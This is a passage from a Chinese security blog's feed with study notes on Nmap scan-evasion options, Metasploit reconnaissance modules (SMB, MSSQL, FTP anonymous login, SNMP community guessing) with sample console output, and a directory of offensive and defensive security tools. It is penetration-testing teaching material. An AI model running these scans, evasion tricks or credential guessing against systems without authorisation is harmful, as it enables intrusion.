id="0x05-高级技术及防御"><a href="#0x05-高级技术及防御" class="headerlink" title="0x05 高级技术及防御"></a>0x05 高级技术及防御</h2><h3 id="1-Nmap-伪装技术"><a href="#1-Nmap-伪装技术" class="headerlink" title="1. Nmap 伪装技术"></a>1. Nmap 伪装技术</h3><p><strong>(1) Nmap -f 目标</strong></p><p>对 Nmap 发送的探测数据包进行<strong>分段</strong>(数据包含有 <code>Fragmentedd IP protocol</code>标识)，使目标网络防御机制例如包过滤，防火墙等在对数据包进行检测时更加困难</p><p><strong>(2) -mtu (使用制定的MTU)</strong></p><pre><code>Nmap --mtu 目标</code></pre><p><strong>(3) -D (decoy1[,decoy2][,ME],…)</strong></p><p>使用诱饵主机隐蔽扫描，逗号分隔每个诱饵IP地址，自己的IP地址可以用ME选项</p><p><strong>(4) –source-port (portnumber)；-g (portnumber) </strong></p><p>源端口欺骗，Nmap可以利用被目标检测机制遗忘的端口发送数据</p><p><strong>(5) –data-length [number]</strong></p><p>发送报文时附加随机数据，避免内容为空的报文被目标网络检测机制发现</p><p><strong>(6) –ttl [value]</strong></p><p>设置IP time-to-live域，指定特定的ttl</p><p><strong>(7) –spoof-mac [mac address，prefix，or vendor name]</strong></p><p>人为指定Nmap在扫描时发送以太网帧的MAC地址</p><h3 id="2-系统扫描防范"><a href="#2-系统扫描防范" class="headerlink" title="2. 系统扫描防范"></a>2. 系统扫描防范</h3><p>补丁，安装更新，防火墙，蜜罐技术等网络安全防护</p><p><strong>(1) Morph</strong></p><p>可将操作系统模拟为其他类型的操作系统，改变原来操作系统对TCP,UDP,ICMP数据包的响应</p><p><strong>(2) IP Personality</strong></p><p>利用iptables来处理TCP和UDP的请求，隐藏操作系统</p><h3 id="3-格式化输出"><a href="#3-格式化输出" class="headerlink" title="3. 格式化输出"></a>3. 格式化输出</h3><p><strong>(1) 文本文件</strong></p><p><em>语法：nmap -oN [#.txt] [target]</em></p><p><strong>(2) xml 格式</strong></p><p><em>语法：nmap -oX [#.xml] [target]</em></p><p><strong>(3) grep 文件</strong></p><p><em>语法：nmap -oX [#.grep] [target]</em></p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;本文参考&lt;a href=&quot;http://www.tup.tsinghua.edu.cn/bookscenter/book_07230301.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;诸神之眼&lt;/a&gt;，由浅入深剖析Nmap进行网络安全审计技术，涉及活跃主机发现，端口扫描，远程操作系统和服务检测等技术&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="0x02 原理浅析" scheme="http://www.firehacker.top/categories/0x02-%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/"/>
    
      <category term="安全工具" scheme="http://www.firehacker.top/categories/0x02-%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="SecTools" scheme="http://www.firehacker.top/tags/SecTools/"/>
    
      <category term="Nmap" scheme="http://www.firehacker.top/tags/Nmap/"/>
    
  </entry>
  
  <entry>
    <title>Metasploit渗透笔记</title>
    <link href="http://www.firehacker.top/2018/08/29/Metasploit%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/"/>
    <id>http://www.firehacker.top/2018/08/29/Metasploit渗透笔记/</id>
    <published>2018-08-29T03:46:11.000Z</published>
    <updated>2018-09-19T03:05:56.008Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p><a href="https://www.metasploit.com/" target="_blank" rel="noopener">Metasploit</a>—世界上最新流行的渗透测试框架之一，本文参考<a href="https://www.offensive-security.com/metasploit-unleashed/" target="_blank" rel="noopener">Offensive-Security-metasploit</a> 及 <a href="https://github.com/Urinx/Books/blob/master/metasploit/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8C%87%E5%8D%97.pdf" target="_blank" rel="noopener">The Penetration Tester’s Guide</a>对Metasploit框架相关技术及渗透测试流程进行分析总结，然后通过实践体验Metasploit的魅力</p></blockquote><a id="more"></a><hr><h2 id="0x01-Metasploit基础"><a href="#0x01-Metasploit基础" class="headerlink" title="0x01 Metasploit基础"></a>0x01 Metasploit基础</h2><h3 id="1-专业术语"><a href="#1-专业术语" class="headerlink" title="1. 专业术语"></a>1. 专业术语</h3><p><strong>(1) 渗透攻击(Exploit)</strong></p><p>由攻击者或渗透测试者利用一个系统，应用或服务中的安全漏洞，所进行的攻击行为</p><p><strong>(2) 攻击载荷(Payload)</strong></p><p>目标系统被渗透攻击之后期望去执行的代码，在MSF中可以自由选择，传送和植入</p><p><strong>(3) Shellcode</strong></p><p>在渗透攻击时作为攻击载荷运行的一组机器指令，常用汇编语言编写</p><p><strong>(4) 模块(Moudle)</strong></p><p>指Metasploit框架中所使用的一段软件代码组件</p><p><strong>(5) 监听器(Listener)</strong></p><p>Metasploit中用来等待连入网络连接的组件</p><h3 id="2-用户接口"><a href="#2-用户接口" class="headerlink" title="2. 用户接口"></a>2. 用户接口</h3><p><strong>(1) MSF终端</strong></p><p>一种用户友好的模式提供交互方式，用于访问软件所有的功能特性</p><pre><code>msfconsole</code></pre><p><strong>(2) MSF命令行 </strong></p><p><code>msfcli</code>考虑用脚本处理和玉其他命令行工具的互操作性，新版本不再支持，使用<code>msfconsole -x</code>代替</p><p><strong>(3) Armitage</strong></p><p><code>armitage</code>组件是一个完全交互式的图形化用户接口</p><pre><code>armitage</code></pre><h3 id="3-功能程序"><a href="#3-功能程序" class="headerlink" title="3. 功能程序"></a>3. 功能程序</h3><p><strong>(1) MSF攻击载荷生成器</strong></p><p>能够生成<code>shellcode</code>，可执行代码，可以在框架软件之外的渗透代码中进行使用，<code>msfpayload</code>已弃用，由<code>msfvenom</code>工具代替</p><p><strong>(2) MSF编码器</strong></p><p>通过对原始攻击载荷进行编码，来避免坏字符，以及逃避杀毒软件和IDS的检测，<code>msfencode</code>由<code>msfvenom</code>取代</p><p><strong>(3) Nasm Shell</strong></p><p><code>nasm_shell.rb</code>功能程序可对给定的汇编命令找出其opcode操作码</p><hr><h2 id="0x02-情报收集"><a href="#0x02-情报收集" class="headerlink" title="0x02 情报收集"></a>0x02 情报收集</h2><h3 id="1-被动信息收集"><a href="#1-被动信息收集" class="headerlink" title="1. 被动信息收集"></a>1. 被动信息收集</h3><p>在不接触目标系统的情况下挖掘目标信息，<strong>公开情报渠道(OSINT)</strong>是一类对公开和已知信息来检索和筛选就可以获取到的目标情报集合</p><p><strong>(1) whois 查询</strong></p><pre><code>msf &gt; whois 域名</code></pre><p><strong>(2) Netcraft</strong></p><p><a href="https://searchdns.netcraft.com/" target="_blank" rel="noopener">Netcraft</a>一个网页界面的工具，可以发现承载某个特定网站的服务器IP地址</p><pre><code>msf &gt; whois IP</code></pre><p><strong>(3) NSLookup</strong></p><p>可以用于获取关于服务器的附加信息</p><pre><code>root@kali:~# nslookup&gt; 域名</code></pre><h3 id="2-主动信息收集"><a href="#2-主动信息收集" class="headerlink" title="2. 主动信息收集"></a>2. 主动信息收集</h3><p>与目标系统直接交互，从而对其进行更深入的了解；注意可能被IDS或IPS发现</p><p><strong>(1) Nmap 端口扫描</strong></p><pre><code>root@kali:~# nmap -sS -Pn IP</code></pre><p><code>-sS</code>选项用于执行一次隐秘的TCP扫描，以确定某个特定的TCP端口是否开放；</p><p><code>-Pn</code>选项告诉nmap不使用ping命令预先判断主机是否存活，默认所有主机处于存活状态，大多数网络不允许ping命令的ICMP通行，避免漏掉许多实际存活的主机</p><p><strong>(2) 在Metasploit中使用数据库</strong></p><p>Metasploit 支持 MySQL，PostgreSQL 和 SQLite3 数据库</p><p>使用init.d脚本启动数据库子系统</p><pre><code>root@kali~# /etc/init.d/postgresql start</code></pre><p>Metasploit 框架连接数据库实例</p><pre><code>msf &gt; db_connect postgres:toor@127.0.0.1/msfbook</code></pre><p>PostgreSQL默认用户名为postgres，口令为toor，使用msfbook作为数据库名</p><p>数据库连接状态查看</p><pre><code>msf &gt; db_status</code></pre><p>A. <strong> 将Nmap输出的结果导入Metasploit</strong></p><p>使用<code>-oX</code>选项进行扫描，生成名为<code>subnet.xml</code>的文件</p><pre><code>nmap -Pn -sS -A -oX submet 192.168.1.0/24</code></pre><p>使用<code>db_import</code>命令将文件导入到数据库中；完毕后，可使用<code>db_hosts</code>命令合适导入的结果(显示数据库中所有已保存的主机信息)</p><pre><code>msf &gt; db_connect postgres:passwd@127.0.0.1/msf3msf &gt; db_import sbumet.xmlmsf &gt; hosts -c address</code></pre><p>B. <strong>高级 Nmap 技巧: TCP 空闲扫描</strong></p><p>TCP 空闲扫描：冒充网络上另一台主机的IP地址，对目标进行隐秘的扫描；可使用Meatsploit框架中的<em>scanner/ip/ipidseq</em>模块，寻找满足TCP空闲扫描要求的空闲主机</p><pre><code>msf &gt; use auxiliary/scanner/ip/ipidseqmsf auxiliary(ipidseq) &gt; show options</code></pre><p>列表显示了执行<em>ipidseq</em>扫描所需的所有参数；<code>RHOST</code>-此参数可使用IP地址段，CIDR地址快，逗号分隔的多个CIDR地址块；<code>THREAD</code>-此参数设定扫描线程数，默认为1，增加参数值可提高扫描速度，降低参数值可减少网络上的数据流量</p><p>设定好参数并执行扫描模块</p><pre><code>msf auxiliary(ipidseq) &gt; set RHOSTS 192.168.1.0/24RHOSTS =&gt; 192.168.1.0/24msf auxiliary(ipidseq) &gt; set THREADS 50THREADS =&gt; 50msf auxiliary(ipidseq) &gt; run</code></pre><p>尝试在nmap中使用-sI选项指定特定IP作为空闲主机(<code>Incremental</code>)对目标主机进行扫描</p><pre><code>msf auxiliary(ipidseq) &gt; nmap -PN -sI 空闲IP 目标IP</code></pre><p>C. <strong> 在 MSF 终端中运行 Nmap</strong></p><p>连接到数据库</p><pre><code>msf &gt; db_connect postgres:passwd@127.0.0.1/msf3</code></pre><p>输入<code>db_nmap</code>命令，在MSF终端中运行nmap，并自动将nmap结果存储在数据库中</p><pre><code>msf &gt; db_nmap -sS -A 192.168.1.0/24</code></pre><p>执行 <code>db_services</code> 命令查看数据库中的关于系统上运行服务的扫描结果</p><pre><code>msf &gt; services</code></pre><p><strong>(3) 使用Metasploit进行端口扫描</strong></p><p>查看Metasploit框架中提供的端口扫描工具</p><pre><code>msf &gt; search portscan</code></pre><p>使用Metasploit的SYN端口扫描器对单个主机进行一次简单扫描</p><pre><code>msf &gt; use scanner/portscan/synmsf auxiliary(syn) &gt; set RHOSTS IPRHOSTS =&gt; IPmsf auxiliary(syn) &gt; set THREADS 50THREADS =&gt; 50</code></pre><h3 id="3-针对性扫描"><a href="#3-针对性扫描" class="headerlink" title="3. 针对性扫描"></a>3. 针对性扫描</h3><p><strong>(1) 服务器消息块协议扫描</strong></p><p>利用<code>smb_version</code>模块遍历一个网络，获取Windows系统的版本号</p><pre><code>msf &gt; use scanner/smb/smb_versionmsf auxiliary(scanner/smb/smb_version) &gt; show optionsModule options (auxiliary/scanner/smb/smb_version):   Name       Current Setting  Required  Description   -----------------------------------------------------------------------------------   RHOSTS                      yes       The target address range or CIDR identifier   SMBDomain  .                no        The Windows domain to use for authentication   SMBPass                     no        The password for the specified username   SMBUser                     no        The username to authenticate as   THREADS    1                yes       The number of concurrent threadsmsf auxiliary(scanner/smb/smb_version) &gt; set RHOSTS IPRHOSTS =&gt; IPmsf auxiliary(scanner/smb/smb_version) &gt; run</code></pre><p>可使用 <code>hosts</code> 命令查看数据库中保存的结果</p><pre><code>msf auxiliary(scanner/smb/smb_version) &gt; hosts</code></pre><p><strong>(2) 搜寻配置不当的Microsoft SQL Server</strong></p><p>配置不当的MS SQL通常为进入目标系统的第一个后门，容易被忽略；使用<code>mssql_ping</code>对UDP端口1434进行查询，获取随机的TCP端口(1433)</p><pre><code>msf &gt; use scanner/mssql/mssql_pingmsf auxiliary(scanner/mssql/mssql_ping) &gt; show optionsModule options (auxiliary/scanner/mssql/mssql_ping):   Name                 Current Setting  Required  Description   ----                 ---------------  --------  -----------   PASSWORD                              no        The password for the specified username   RHOSTS                                yes       The target address range or CIDR identifier   TDSENCRYPTION        false            yes       Use TLS/SSL for TDS data &quot;Force Encryption&quot;   THREADS              1                yes       The number of concurrent threads   USERNAME             sa               no        The username to authenticate as   USE_WINDOWS_AUTHENT  false            yes       Use windows authentification (requires DOMAIN option set)msf auxiliary(scanner/mssql/mssql_ping) &gt; set RHOSTS 192.168.1.0/24RHOSTS =&gt; 192.168.1.0/24msf auxiliary(scanner/mssql/mssql_ping) &gt; set THREADS 255THREADS =&gt; 255msf auxiliary(scanner/mssql/mssql_ping) &gt; run</code></pre><p><strong>(3) SSH 服务器扫描</strong></p><p>许多SSH实现版本中均被发现了安全漏洞，使用Metasploit框架的 <code>ssh_version</code> 模块来识别目标服务器上运行的SSH版本</p><pre><code>msf &gt; use scanner/ssh/ssh_versionmsf auxiliary(scanner/ssh/ssh_version) &gt; set THREADS 50THREADS =&gt; 50msf auxiliary(scanner/ssh/ssh_version) &gt; run </code></pre><p><strong>(4) FTP 扫描</strong></p><p>FTP服务器是进入一个目标网络最便捷的途径，使用Metasploit框架中<code>ftp_version</code>模块可以对 windows 虚拟机FTP服务器进行扫描</p><pre><code>msf &gt; use scanner/ftp/ftp_versionmsf auxiliary(scanner/ftp/ftp_version) &gt; show optionsModule options (auxiliary/scanner/ftp/ftp_version):   Name     Current Setting      Required  Description   ----     ---------------      --------  -----------   FTPPASS  mozilla@example.com  no        The password for the specified username   FTPUSER  anonymous            no        The username to authenticate as   RHOSTS                        yes       The target address range or CIDR identifier   RPORT    21                   yes       The target port (TCP)   THREADS  1                    yes       The number of concurrent threadsmsf auxiliary(scanner/ftp/ftp_version) &gt; set RHOSTS ipRHOSTS =&gt; ipmsf auxiliary(scanner/ftp/ftp_version) &gt; set THREADS 50THREADS =&gt; 50msf auxiliary(scanner/ftp/ftp_version) &gt; run</code></pre><p>若成功识别出FTP服务器，可用scanner/ftp/anonymous模块检查FTP服务器是否允许匿名登录</p><pre><code>msf &gt; use auxiliary/scanner/ftp/anonymousmsf auxiliary(scanner/ftp/anonymous) &gt; set RHOSTS 192.168.1.0/24RHOSTS =&gt; 192.168.1.0/24msf auxiliary(scanner/ftp/anonymous) &gt; set THREADS 50THREADS =&gt; 50msf auxiliary(scanner/ftp/anonymous) &gt; run</code></pre><p><strong>(5) SNMP 扫描</strong></p><p>SNMP通常用于网络设备中，用来报告带宽利用率，冲突率等，也可包含在OS中，用来提供类似CPU利用率，空闲内存以及系统状态信息等</p><p>Metasploit 框架中包含内置辅助模块<code>scanner/snmp/snmp_enum</code>，为SNMP扫描专门设计；利用<code>scanner/snmp/snmp_login</code>模块可尝试对一个IP或一组IP使用字典猜解SNMP团体字符串</p><pre><code>msf &gt; use scanner/snmp/snmp_loginmsf auxiliary(scanner/snmp/snmp_login) &gt; set RHOSTS 192.168.1.0/24RHOSTS =&gt; 192.168.139.0/24msf auxiliary(scanner/snmp/snmp_login) &gt; set THREADS 50THREADS =&gt; 50msf auxiliary(scanner/snmp/snmp_login) &gt; run</code></pre><hr><h2 id="0x03-漏洞扫描"><a href="#0x03-漏洞扫描" class="headerlink" title="0x03 漏洞扫描"></a>0x03 漏洞扫描</h2><h3 id="1-基本漏洞扫描"><a href="#1-基本漏洞扫描" class="headerlink" title="1. 基本漏洞扫描"></a>1. 基本漏洞扫描</h3><p><strong>旗标攫取：</strong>连接到一个远程网络服务，并读取该服务独特的标识</p><p>使用<code>netcat</code>获取目标IP的旗标</p><pre><code>root@kali:~# nc IP port</code></pre><h3 id="2-使用-NeXpose-进行扫描"><a href="#2-使用-NeXpose-进行扫描" class="headerlink" title="2. 使用 NeXpose 进行扫描"></a>2. 使用 NeXpose 进行扫描</h3><p>通过对网络进行扫描，查找出网络上正在运行的设备，最终识别出操作系统和应用程序上的安全漏洞</p><h3 id="3-使用-Nessus-进行扫描"><a href="#3-使用-Nessus-进行扫描" class="headerlink" title="3. 使用 Nessus 进行扫描"></a>3. 使用 Nessus 进行扫描</h3><p>Nessus 漏洞扫描器是世界上使用最广泛的漏洞扫描器之一</p><h3 id="4-专用漏洞扫描器"><a href="#4-专用漏洞扫描器" class="headerlink" title="4. 专用漏洞扫描器"></a>4. 专用漏洞扫描器</h3><p><strong>(1) 验证 SMB 登录</strong></p><p><strong>(2) 扫描开放的 VNC 空口令</strong></p><p><strong>(3) 扫描开放的 X11 服务器</strong></p><h3 id="5-自动化攻击"><a href="#5-自动化攻击" class="headerlink" title="5. 自动化攻击"></a>5. 自动化攻击</h3><hr><h2 id="0x04-渗透攻击"><a href="#0x04-渗透攻击" class="headerlink" title="0x04 渗透攻击"></a>0x04 渗透攻击</h2><h3 id="1-渗透攻击基础"><a href="#1-渗透攻击基础" class="headerlink" title="1. 渗透攻击基础"></a>1. 渗透攻击基础</h3><p><strong>(1) msf &gt; show exploits</strong></p><p>显示 Metasploit 框架中所有可用的<strong>渗透攻击模块</strong>，在 MSF终端中，针对渗透测试中发现的安全漏洞来实施相应的渗透攻击</p><p><strong>(2) msf &gt; show auxiliary</strong></p><p>显示所有的<strong>辅助模块</strong>及其用途，可以是扫描器，拒绝服务攻击工具，Fuzz测试器，以及其他类型工具</p><p><strong>(3) msf &gt; show options</strong></p><p>列出模块所需的各种参数，未选择模块时，显示所有的全局参数</p><p><strong>back 命令：</strong>返回 Metasploit 的上一个状态 </p><p><strong>search 命令：</strong>查找某个特定的渗透攻击，辅助或者攻击在和模块</p><p><strong>use 命令：</strong>加载模块，此时终端中输入的命令在此攻击模块环境中运行</p><p><strong>show options：</strong>在已选择模块的命令下，显示模块所需的参数</p><p><strong>(4) msf &gt; show payloads</strong></p><p>将与当前模块兼容的攻击载荷显示出来</p><p><strong>serach 模块 —&gt; use 模块 —&gt; show payloads —&gt; set payload 攻击载荷 —&gt; show options —&gt; payload 利用</strong></p><p><strong>(5) msf &gt; show targets</strong></p><p>渗透攻击模块可列出受到漏洞影响目标系统的类型</p><p><strong>use exploit —&gt; show targets</strong></p><p><strong>(6) info</strong></p><p><strong>exploit &gt; info / info exploit：</strong>显示模块的详细信息，参数说明以及所有可用的目标操作系统</p><p><strong>(7) set 和 unset</strong></p><p>参数状态：设置(<strong>set</strong>)或未设置(<strong>unset</strong>)，有些参数被标记为必填项(required)，使用时需经过手工设置并处于启用状态</p><p><strong>set</strong> 命令：对某个参数进行设置(同时启用该参数)；<strong>unset</strong> 命令：禁用相关参数</p><p><strong>(8) setg 和 unsetg</strong></p><p>对全局参数进行设置或清楚，对常用且很少改变的参数设置方便</p><p><strong>(9) save</strong></p><p>使用setg命令对全局参数进行设置胡，可使用save命令将当前设置值保存下来，下次启用依然使用</p><p>设置值保存在<code>/root/.msf4/config</code>，将此文件删除或移动，可恢复原始设置</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://www.metasploit.com/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Metasploit&lt;/a&gt;—世界上最新流行的渗透测试框架之一，本文参考&lt;a href=&quot;https://www.offensive-security.com/metasploit-unleashed/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Offensive-Security-metasploit&lt;/a&gt; 及 &lt;a href=&quot;https://github.com/Urinx/Books/blob/master/metasploit/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8C%87%E5%8D%97.pdf&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;The Penetration Tester’s Guide&lt;/a&gt;对Metasploit框架相关技术及渗透测试流程进行分析总结，然后通过实践体验Metasploit的魅力&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="0x02 原理浅析" scheme="http://www.firehacker.top/categories/0x02-%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/"/>
    
      <category term="渗透测试" scheme="http://www.firehacker.top/categories/0x02-%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="Pentest" scheme="http://www.firehacker.top/tags/Pentest/"/>
    
      <category term="Metasploit" scheme="http://www.firehacker.top/tags/Metasploit/"/>
    
  </entry>
  
  <entry>
    <title>安全与计算机工具导航</title>
    <link href="http://www.firehacker.top/2018/08/24/%E5%AE%89%E5%85%A8%E4%B8%8E%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%B7%A5%E5%85%B7%E5%AF%BC%E8%88%AA/"/>
    <id>http://www.firehacker.top/2018/08/24/安全与计算机工具导航/</id>
    <published>2018-08-24T03:16:55.000Z</published>
    <updated>2018-08-24T14:46:13.549Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>参考网络上的资源，整理的一些安全与计算机类<a href="https://firehacker.top/tools/" target="_blank" rel="noopener">Tools</a>，SecTools 涉及渗透平台及框架，漏洞扫描与利用，信息收集，网络分析，密码攻击，逆向工程，安全防御等；计算机类工具包括主流代码编辑器/编译器，问答社区，开源社区，博客平台，分布式系统，深度学习框架等</p></blockquote><a id="more"></a><hr><h2 id="SecTools"><a href="#SecTools" class="headerlink" title="SecTools"></a>SecTools</h2><h3 id="系统平台"><a href="#系统平台" class="headerlink" title="系统平台"></a>系统平台</h3><ul><li><p><a href="https://www.kali.org/" target="_blank" rel="noopener">Kali</a> <em>基于Debian的Linux发行版，专业的数字取证与渗透测试平台</em></p></li><li><p><a href="https://backbox.org/linux" target="_blank" rel="noopener">BackBox</a> <em>基于Ubuntu的Linux发行版的渗透测试和安全评估平台</em></p></li><li><p><a href="https://www.pentoo.ch/" target="_blank" rel="noopener">Pentoo</a> <em>一个为Live CD与Live USB设计的进行渗透测试与安全评估的Linux发行版</em></p></li><li><p><a href="https://archstrike.org/" target="_blank" rel="noopener">ArchStrike</a> <em>适用于安全专业人员和爱好者的Arch Linux存储库</em></p></li><li><p><a href="https://blackarch.org/" target="_blank" rel="noopener">BlackArch</a> <em>一款基于Arch的Linux发行版，用于系统渗透测试及安全研究的平台</em></p></li><li><p><a href="https://pentestbox.org/zh/" target="_blank" rel="noopener">PentestBox</a> <em>一款Windows平台下预配置的便携式开源渗透测试环境</em></p></li></ul><h3 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h3><ul><li><p><a href="https://www.tenable.com/products/nessus/nessus-professional" target="_blank" rel="noopener">Nessus</a> <em>世界上最流行的漏洞扫描程序之一</em></p></li><li><p><a href="http://www.openvas.org/" target="_blank" rel="noopener">OpenVAS</a> <em>一个提供漏洞扫描和漏洞管理的多种服务和工具的软件框架</em></p></li><li><p><a href="https://www.rapid7.com/products/nexpose/" target="_blank" rel="noopener">Nexpose</a> <em>一款漏洞扫描程序，支持漏洞发现，检测，验证，风险分类，影响分析，报告和缓解</em></p></li></ul><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><ul><li><p><a href="https://www.metasploit.com/" target="_blank" rel="noopener">Metasploit</a> <em>世界上最常用的渗透测试框架之一</em></p></li><li><p><a href="http://exploitpack.com/" target="_blank" rel="noopener">ExploitPack</a> <em>一个用于执行专业渗透测试的集成环境</em></p></li><li><p><a href="https://www.offensive-security.com/metasploit-unleashed/armitage/" target="_blank" rel="noopener">Armitage</a> <em>Metasploit Project的图形网络攻击管理工具，可以对目标进行可视化并推荐漏洞利用</em></p></li><li><p><a href="https://beefproject.com/" target="_blank" rel="noopener">BeEF</a> <em>The Browser Exploitation Framework，一种专注于Web浏览器的渗透测试工具</em></p></li><li><p><a href="https://github.com/byt3bl33d3r/CrackMapExec/wiki" target="_blank" rel="noopener">CME</a> <em>CrackMapExe是一种漏洞利用工具，可帮助自动评估大型Active Directory网络的安全性</em></p></li></ul><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><ul><li><p><a href="https://nmap.org/" target="_blank" rel="noopener">Nmap</a> <em>一个免费开源的用于网络发现和安全审计的网络映射实用程序</em></p></li><li><p><a href="https://nmap.org/zenmap/" target="_blank" rel="noopener">Zenmap</a> <em>官方的Nmap Security Scanner GUI，一个多平台免费和开源应用程序</em></p></li><li><p><a href="https://www.paterva.com/web7/buy/maltego-clients/maltego-ce.php" target="_blank" rel="noopener">Maltego</a> <em>一种交互式数据挖掘工具，可以为链接分析提供有向图，用于在线调查</em></p></li><li><p><a href="http://lcamtuf.coredump.cx/p0f3/#" target="_blank" rel="noopener">P0f</a> <em>一个多功能工具，用于被动式获取操作系统指纹，以识别远程主机操作系统</em></p></li><li><p><a href="https://tools.kali.org/information-gathering/dmitry" target="_blank" rel="noopener">DMitry</a> <em>Deepmagic，一款是用C编写的UNIX /（GNU）Linux命令行信息收集工具</em></p></li><li><p><a href="https://www.shodan.io/" target="_blank" rel="noopener">Shodan</a> <em>强大的搜索引擎，可使用各种过滤器连接到互联网的特定类型的互联网设备</em></p></li><li><p><a href="https://www.zoomeye.org/" target="_blank" rel="noopener">ZoomEye</a> <em>钟馗之眼，知道创宇开发的一款强大的检索网络空间节点的搜索引擎</em></p></li><li><p><a href="https://censys.io/" target="_blank" rel="noopener">Censys</a> <em>一个平台，可帮助信息安全从业者发现，监控和分析可从Internet访问的设备</em></p></li><li><p><a href="https://www.torproject.org/index.html.en" target="_blank" rel="noopener">Tor Browser</a> <em>Tor(The Onion Router)项目的旗舰产品，一款可实现匿名通信的浏览器，慎用</em></p></li></ul><h3 id="网络分析"><a href="#网络分析" class="headerlink" title="网络分析"></a>网络分析</h3><ul><li><p><a href="https://www.wireshark.org/" target="_blank" rel="noopener">Wireshark</a> <em>一款世界上最广泛使用的免费开源的网络数据包分析工具</em></p></li><li><p><a href="https://www.tcpdump.org/" target="_blank" rel="noopener">Tcpdump</a> <em>一个功能强大的命令行数据包分析器</em></p></li><li><p><a href="https://tools.kali.org/information-gathering/dnsenum" target="_blank" rel="noopener">DNSenum </a> <em>一款强大的域名信息收集工具</em></p></li><li><p><a href="https://network-tools.com/" target="_blank" rel="noopener">Net Tools</a> <em>网络工具集，包括Expres，Ping，Trace，Whois等多种工具</em></p></li><li><p><a href="https://github.com/hatRiot/zarp" target="_blank" rel="noopener">Zarp</a> <em>一种以利用本地网络为中心的网络攻击工具</em></p></li><li><p><a href="https://www.monkey.org/~dugsong/dsniff/" target="_blank" rel="noopener">Dsniff</a> <em>一系列用于网络审计和渗透测试的工具</em></p></li><li><p><a href="https://scapy.net/" target="_blank" rel="noopener">Scapy</a> <em>一个功能强大的交互式数据包操作程序</em></p></li><li><p><a href="http://netcat.sourceforge.net/" target="_blank" rel="noopener">Netcat</a> <em>一款网络实用程序，使用TCP/IP协议跨网络连接读取和写入数据</em></p></li><li><p><a href="https://github.com/nabla-c0d3/sslyze" target="_blank" rel="noopener">SSLyze</a> <em>一个Python库和一个CLI工具，可以通过连接来分析服务器的SSL配置</em></p></li><li><p><a href="https://github.com/cisco/joy" target="_blank" rel="noopener">Cisco Joy</a> <em>一款用于用于从实时网络流量或数据包捕获（pcap）文件中提取数据特征的工具</em></p></li></ul><h3 id="密码攻击"><a href="#密码攻击" class="headerlink" title="密码攻击"></a>密码攻击</h3><ul><li><p><a href="http://www.openwall.com/john/" target="_blank" rel="noopener">John the Ripper</a> <em>一款跨平台快速密码破解程序</em></p></li><li><p><a href="https://github.com/vanhauser-thc/thc-hydra" target="_blank" rel="noopener">Hydra</a> <em>一款可以支持多种协议和并行连接的密码破解工具</em></p></li><li><p><a href="https://github.com/gentilkiwi/mimikatz" target="_blank" rel="noopener">Mimikatz</a> <em>一款windows平台下密码破解与抓取的工具</em></p></li><li><p><a href="https://digi.ninja/projects/cewl.php" target="_blank" rel="noopener">Cewl</a> <em>一个ruby应用程序开发的自定义字典列表生成器</em></p></li><li><p><a href="https://sourceforge.net/projects/crunch-wordlist/" target="_blank" rel="noopener">Crunch</a> <em>一个wordlist生成器，可以在其中指定标准字符集</em></p></li><li><p><a href="https://hashcat.net/hashcat/" target="_blank" rel="noopener">Hashcat</a> <em>高级密码恢复工具，支持多种哈希算法破解</em></p></li></ul><h3 id="无线网络"><a href="#无线网络" class="headerlink" title="无线网络"></a>无线网络</h3><ul><li><p><a href="https://www.aircrack-ng.org/" target="_blank" rel="noopener">Aircrack-ng</a> <em>一款评估WiFi网络安全性的一整套工具集</em></p></li><li><p><a href="https://www.kismetwireless.net/" target="_blank" rel="noopener">Kismet</a> <em>一款无线网络探测器和入侵检测系统</em></p></li><li><p><a href="https://github.com/derv82/wifite2" target="_blank" rel="noopener">Wifite</a> <em>一种自动化无线攻击与审计工具</em></p></li><li><p><a href="https://github.com/t6x/reaver-wps-fork-t6x" target="_blank" rel="noopener">Reaver</a> <em>一款针对WPS的强大而实用的攻击工具</em></p></li><li><p><a href="https://github.com/nfc-tools/mfoc" target="_blank" rel="noopener">Mfoc</a> <em>Nthemba的“离线嵌套”攻击的开源程序</em></p></li><li><p><a href="https://wifiphisher.org/" target="_blank" rel="noopener">Wifiphisher</a> <em>一款针对WiFi的自动化钓鱼攻击工具</em></p></li></ul><h3 id="逆向工程"><a href="#逆向工程" class="headerlink" title="逆向工程"></a>逆向工程</h3><ul><li><p><a href="https://www.hex-rays.com/products/ida/" target="_blank" rel="noopener">IDA Pro</a> <em>一个支持多平台的反汇编工具和调试器</em></p></li><li><p><a href="http://www.ollydbg.de/" target="_blank" rel="noopener">OllyDbg</a> <em>一个二进制代码分析的x86调试器</em></p></li><li><p><a href="https://ibotpeaches.github.io/Apktool/" target="_blank" rel="noopener">Apktool</a> <em>一款用于逆向Android apk文件的工具</em></p></li><li><p><a href="https://www.radare.org/r/index.html" target="_blank" rel="noopener">Radare2</a> <em>开源跨平台逆向工程框架</em></p></li><li><p><a 